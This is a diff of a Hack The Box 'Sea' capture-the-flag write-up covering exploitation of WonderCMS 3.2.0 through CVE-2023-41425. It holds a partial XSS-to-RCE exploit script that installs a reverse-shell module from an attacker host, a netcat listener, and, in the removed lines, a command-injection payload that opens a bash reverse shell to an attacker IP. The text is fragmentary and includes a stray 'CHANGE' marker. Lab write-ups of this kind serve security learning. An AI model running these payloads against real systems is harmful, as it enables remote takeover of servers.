@@ -1,4 +1,15 @@
+Knowing the backend CMS, we now need to find the version. We have the file called version which actually discloses the WonderCMS version.
+
 ```
+curl http://sea.htb/themes/bike/version
+
+3.2.0
+```
+
+this version of WonderCMS is vulnerable to CVE-2023-41425 which is a cross-site scripting vulnerability allowing remote code execution if exploited successfully. Linked in the vulnerability disclosure is a proof of concept that explains the attack in detail and provides us with a script to exploit the target.
+
+Exploit.py
+```exploit.py
 # Exploit: WonderCMS XSS to RCE
 import sys
 import requests
@@ -13,9 +24,9 @@ if (url.endsWith("/")) {
  url = url.slice(0, -1);
 }
 var urlWithoutLog = url.split("/").slice(0, -1).join("/");
-var urlWithoutLogBase = "http://sea.htb"; 
+var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
 var token = document.querySelectorAll('[name="token"]')[0].value;
-var urlRev = urlWithoutLogBase+"/?installModule=http://10.10.16.66:8000/main.zip&directoryName=violet&type=themes&token=" + token;
+var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
 var xhr3 = new XMLHttpRequest();
 xhr3.withCredentials = true;
 xhr3.open("GET", urlRev);
@@ -56,237 +67,21 @@ xhr3.onload = function() {
 ```
 
 ```
-ssh amay@10.129.224.151
+wget https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip
 ```
 
-```
-ssh amay@sea.htb -L 8080:localhost:8080
-```
-
-```
-log_file=%2Fvar%2Flog%2Fapache2%2F;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.16.66/4444+0>%261'&analyze_log=
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
+CHANGE
 
 ```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
+var urlRev = urlWithoutLogBase+"/? installModule=http://10.10.16.19:8000/main.zip&directoryName=violet&type=themes&t oken=" + token;
 ```
 
 ```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
+var urlWithoutLogBase = "http://sea.htb";
 ```
 
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
-
-```
+---
 
 ```
-
-```
-
-```
-
-```
-
+nc -lvnp 4444
 ```
